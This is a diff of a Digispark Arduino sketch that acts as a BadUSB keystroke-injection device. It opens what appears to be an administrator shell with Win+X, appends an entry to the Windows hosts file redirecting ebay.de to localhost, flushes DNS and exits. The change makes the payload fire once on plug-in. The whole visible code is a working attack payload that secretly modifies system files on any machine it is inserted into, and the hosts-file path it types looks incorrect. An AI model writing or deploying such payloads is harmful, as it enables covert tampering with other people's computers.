@@ -1,8 +1,5 @@
 #include "DigiKeyboardDe.h"
 void setup() {
-}
-
-void loop() {
   DigiKeyboard.sendKeyStroke(0);
   DigiKeyboard.sendKeyStroke(KEY_X, MOD_GUI_LEFT);
   DigiKeyboard.sendKeyStroke(KEY_A);
@@ -45,5 +42,5 @@ void loop() {
   DigiKeyboard.println("ECHO 127.0.0.1 ebay.de >> C:/SYSTEM32/DRIVERS/ETC/HOSTS");
   DigiKeyboard.println("ipconfig /flushdns");
   DigiKeyboard.println("exit");
-  for(;;){}
 }
+void loop() {}
